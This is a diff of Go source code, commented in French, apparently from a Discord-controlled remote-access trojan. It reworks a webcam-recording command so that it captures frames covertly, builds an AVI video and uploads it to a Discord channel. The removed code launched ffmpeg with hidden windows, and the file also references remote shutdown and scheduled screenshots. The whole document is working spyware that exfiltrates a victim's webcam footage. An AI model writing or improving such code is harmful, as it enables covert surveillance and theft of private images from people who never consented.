@@ -6,6 +6,8 @@ import (
 	"bytes"
 	"context"
 	"fmt"
+	"image"
+	_ "image/jpeg"
 	"io"
 	"net/http"
 	"os"
@@ -213,81 +215,64 @@ func shutdownPC(restart bool, timeoutSec int) string {
 	return fmt.Sprintf("PC %s dans %d secondes (forcé).", actionStr, timeoutSec)
 }
 
-// webcamRecord enregistre une vidéo webcam (secondes) → MP4 via ffmpeg si dispo,
-// sinon série de photos (fallback).
+// webcamRecord produit une vidéo MJPEG (.avi) sans dépendance : une webcam
+// rend du JPEG, on assemble les images dans un conteneur AVI. La cadence
+// dépend de la vitesse réelle de capture (PowerShell/WinRT réinitialise la
+// caméra à chaque photo) : compter 1 à 2 images par seconde.
 func webcamRecord(seconds int) string {
 	if seconds <= 0 || seconds > 300 {
 		return "usage : !webcamrec <secondes 1-300>"
 	}
-	// Vérifier ffmpeg
-	if _, err := exec.LookPath("ffmpeg"); err == nil {
-		return webcamRecordFFmpeg(seconds)
+	if stopped.Load() {
+		return "payload arrêté."
 	}
-	return webcamRecordPhotos(seconds)
-}
-
-func webcamRecordFFmpeg(seconds int) string {
-	out := workPath(fmt.Sprintf("camrec-%d.mp4", time.Now().Unix()))
-	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(seconds+10)*time.Second)
-	defer cancel()
-
-	// dshow : video="USB Camera" — on prend le premier device vidéo
-	cmd := exec.CommandContext(ctx, "ffmpeg", "-y", "-f", "dshow",
-		"-i", "video=USB Camera", "-t", fmt.Sprintf("%d", seconds),
-		"-c:v", "libx264", "-preset", "veryfast", "-pix_fmt", "yuv420p", out)
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
-	if err := cmd.Run(); err != nil {
-		return "erreur ffmpeg : " + err.Error()
+	// Deux images par seconde visées, plafonnées à 120 images (taille Discord).
+	count := seconds * 2
+	if count > 120 {
+		count = 120
 	}
-	b, err := os.ReadFile(out)
-	if err != nil {
-		return "erreur lecture : " + err.Error()
-	}
-	_ = os.Remove(out)
-	if len(b) > 8*1024*1024 {
-		return "vidéo trop grosse (>8 Mo)"
-	}
-	discordUploadToChannel(fileOut{Name: filepath.Base(out), Data: b})
-	return "vidéo webcam envoyée (" + fmt.Sprintf("%.1f", float64(len(b))/1024/1024) + " Mo)"
-}
-
-func webcamRecordPhotos(seconds int) string {
-	interval := 500 * time.Millisecond // 2 fps
-	frames := seconds * 2
 	dir := workPath(fmt.Sprintf("camrec-%d", time.Now().Unix()))
-	_ = os.MkdirAll(dir, 0755)
-	defer os.RemoveAll(dir)
+	_ = os.RemoveAll(dir)
+	n, err := webcamCaptureSeries(dir, count, 500)
+	if err != nil {
+		_ = os.RemoveAll(dir)
+		return "capture vidéo impossible : " + err.Error()
+	}
+	frames := seriesFrames(dir)
+	_ = os.RemoveAll(dir)
+	if len(frames) == 0 {
+		return "aucune image récupérée."
+	}
 
-	for i := 0; i < frames; i++ {
-		if stopped.Load() {
-			break
-		}
-		f := filepath.Join(dir, fmt.Sprintf("frame%04d.jpg", i))
-		if err := webcamCaptureTo(f); err == nil {
-			// continue
-		}
-		time.Sleep(interval)
+	w, h := 0, 0
+	if cfgImg, _, err := image.DecodeConfig(bytes.NewReader(frames[0])); err == nil {
+		w, h = cfgImg.Width, cfgImg.Height
 	}
-	// ZIP
-	var buf bytes.Buffer
-	zw := zip.NewWriter(&buf)
-	filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
-		if err != nil || info.IsDir() {
-			return err
-		}
-		rel, _ := filepath.Rel(dir, path)
-		f, _ := os.Open(path)
-		defer f.Close()
-		w, _ := zw.Create(rel)
-		io.Copy(w, f)
-		return nil
-	})
-	_ = zw.Close()
-	if buf.Len() > 8*1024*1024 {
-		return "archive trop grosse"
+	if w == 0 || h == 0 {
+		w, h = 640, 480
 	}
-	discordUploadToChannel(fileOut{Name: filepath.Base(dir) + ".zip", Data: buf.Bytes()})
-	return fmt.Sprintf("enregistrement %ds (%d photos) envoyé", seconds, frames)
+	// Cadence réelle : images obtenues / durée, bornée à 30 fps.
+	fps := n / seconds
+	if fps < 1 {
+		fps = 1
+	}
+	if fps > 30 {
+		fps = 30
+	}
+	avi := newAVIWriter(w, h, fps, len(frames))
+	for _, f := range frames {
+		avi.add(f)
+	}
+	data, err := avi.build()
+	if err != nil {
+		return "assemblage vidéo impossible : " + err.Error()
+	}
+	if len(data) > 8*1024*1024 {
+		return fmt.Sprintf("vidéo trop lourde (%d Mo) : réduis la durée.", len(data)/1024/1024)
+	}
+	name := fmt.Sprintf("cam-%s.avi", time.Now().Format("060102-150405"))
+	sendFilesTo(webcamChannel(), fileOut{Name: name, Data: data})
+	return fmt.Sprintf("vidéo envoyée : %s (%d images, %d s).", name, n, seconds)
 }
 
 // scheduledScreenshots capture à intervalle donné (secondes) et pousse chaque
